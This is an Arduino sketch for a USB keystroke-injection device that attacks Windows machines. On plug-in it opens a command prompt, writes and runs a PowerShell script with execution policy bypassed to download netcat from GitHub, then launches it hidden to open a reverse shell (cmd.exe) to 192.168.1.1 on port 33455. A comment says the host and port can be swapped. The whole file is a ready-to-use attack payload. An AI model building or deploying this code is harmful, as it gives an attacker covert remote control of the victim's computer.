#include "Keyboard.h"
void typeKey(int key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}
void setup()
{
  Keyboard.begin();
  delay(500);
  delay(400);
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press("r");
  Keyboard.releaseAll();
  delay(100);
  Keyboard.print(F("cmd"));
  typeKey(KEY_RETURN);
  delay(100);
  Keyboard.print(F("cd / & mkdir win & cd win & echo (wget 'https://github.com/Ameg0/netcat/blob/master/nc.exe?raw=true' -OutFile a.exe) > b.PS1 & powershell -ExecutionPolicy ByPass -File b.ps1"));
  typeKey(KEY_RETURN);
  delay(50);
  Keyboard.print(F("START /MIN a.exe 192.168.1.1 33455 -e cmd.exe -d & exit")); #host and port can later be changed
  typeKey(KEY_RETURN);
  Keyboard.end();
}
void loop() {}
